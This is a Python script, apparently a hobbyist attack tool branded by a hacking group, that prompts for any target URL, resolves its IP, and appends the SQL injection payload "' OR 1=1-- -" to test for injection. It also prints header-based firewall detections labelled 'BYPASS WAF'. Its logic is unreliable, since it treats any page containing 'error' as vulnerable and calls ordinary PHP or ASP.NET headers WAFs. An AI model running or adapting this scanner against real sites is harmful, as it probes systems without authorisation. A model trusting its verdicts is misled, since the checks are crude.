import requests
from urllib.parse import urlparse
import socket
import colorama
from colorama import Fore
import os

fy = Fore.YELLOW
fr = Fore.RED 
fg = Fore.GREEN
fm = Fore.MAGENTA
fres = colorama.Style.RESET_ALL

def banner():
  os.system("clear")
  print(f"""{fr} _   __  ____  _______     ____ __  _______  _     ____  _  _____ 
| |__\ \/ /\ \/ /` / /_   | ===|\ \/ /| ()_)| |__ / () \| ||_   _| :: BY TPNET CYBER{fres}
|____||__| /_/\_\ /___/   |____|/_/\_\|_|   |____|\____/|_|  |_|   :: t.me/tpnetofc
""")
def check_connection(url):
    try:
        requests.get(url, timeout=5)
        return True
    except requests.ConnectionError:
        return False

def check_sql_injection(url):
    payload = "' OR 1=1-- -"
    response = requests.get(url + payload)
    
    # Periksa apakah terdapat indikasi error database seperti MySQL, PostgreSQL, dll.
    if "error" in response.text.lower():
        print(f"[{fg}Info{fres}] An injection attack vulnerability was found in: {url}")
    else:
        print(f"[{fy}Message{fres}] not found vuln")
        
    if 'WAF' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected WAF in: {url} {fres}")
    elif 'X-Frame-Options' in response.headers:
      print(f"[{fm}BYPASS X-FRAME{fres}] Detected XFRAME protection: {fy}{url}{fres}")
    elif 'WAF-Version' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected WAF Version: {fy}{url}{fres}")
    elif 'Web-Application-Firewall' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected Web Application Firewall: {fy}{url}{fres}")
    elif 'Server' in response.headers and 'WAF' in response.headers['Server']:
      print(f"[{fm}BYPASS WAF{fres}] Detected WAF from Server Header: {fy}{url}{fres}")
    elif 'X-Mod-Security' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected ModSecurity: {fy}{url}{fres}")
    elif 'X-WebKnight' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected WebKnight: {fy}{url}{fres}")
    elif 'X-AspNet-Version' in response.headers:
      print(f"[{fm}BYPASS WAF{fres}] Detected ASP.NET Version: {fy}{url}{fres}")
    elif 'X-Runtime' in response.headers and 'Rack' in response.headers['X-Runtime']:
      print(f"[{fm}BYPASS WAF{fres}] Detected Rack Runtime: {fy}{url}{fres}")
    elif 'X-Powered-By' in response.headers and 'PHP' in response.headers['X-Powered-By']:
      print(f"[{fm}BYPASS WAF{fres}] Detected PHP: {fy}{url}{fres}")
    elif 'Server' in response.headers and 'cloudflare' in response.headers['Server'].lower():
      print(f"[{fm}BYPASS WAF{fres}] Detected Cloudflare WAF: {fy}{url}{fres}")
    elif 'X-Cdn' in response.headers and 'incapsula' in response.headers['X-Cdn'].lower():
      print(f"[{fm}BYPASS WAF{fres}] Detected Incapsula WAF: {fy}{url}{fres}")
    else:
        print(f"[{fg}Info{fres}] Protection WAF not detected: {fy}{url}{fres}")


# Fungsi untuk mendapatkan status server target
def get_server_status(url):
    try:
        response = requests.head(url, timeout=5)
        if response.status_code == 200:
            print(f"[{fg}Info{fres}] Status server: {fg}Online{fres}")
        else:
            print(f"[{fg}Info{fres}] Status server: {fg}{response.status_code}")
    except requests.ConnectionError:
        print(f"[{fy}WARNING{fres}] Unable to connect to server{fres}")

# Fungsi utama program
def main():
    url = input("Masukkan URL target: ")
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    
    if hostname:
        ip_address = socket.gethostbyname(hostname)
        print(f"[{fg}Info{fres}] IP {hostname} is: {fy}{ip_address}{fres}")
        
        get_server_status(url)

        if check_connection(url):
            print(f"[{fg}Info{fres}] Connect with connection")
            check_sql_injection(url)
        else:
            print(f"[{fy}Warning{fres}] Cannot connect with connection")
    else:
        print("URL tidak valid.")

banner()
if __name__ == "__main__":
    main()
